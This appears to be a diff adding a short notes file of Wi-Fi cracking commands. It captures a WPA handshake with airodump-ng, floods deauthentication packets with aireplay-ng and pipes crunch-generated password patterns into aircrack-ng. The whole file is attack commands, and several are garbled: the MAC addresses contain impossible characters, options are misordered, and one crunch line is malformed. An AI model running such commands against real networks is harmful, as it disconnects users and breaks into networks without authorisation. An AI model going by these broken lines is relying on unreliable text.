@@ -1,0 +1,9 @@
+airodump-ng -c 6 -w --bssid 38:12:H7:9I SCAN_test wlan0
+
+aireplay-ng -0 0 -a 30:S9:7D:0I:L0 wlan0
+
+crunch -t aircrack-ng -w - SCAN_test-01.cap -e Something
+
+crunch 11 11 -t %%%%Thunder 1234567890 | aircrack-ng -w - SCAN_test-01.cap -e Something
+
+crunch 11 11 -t %%%%,@@@der -f charset.lst maxalpha-numeric-space | aircrack-ng -w - SCAN_test-01.cap -e Something
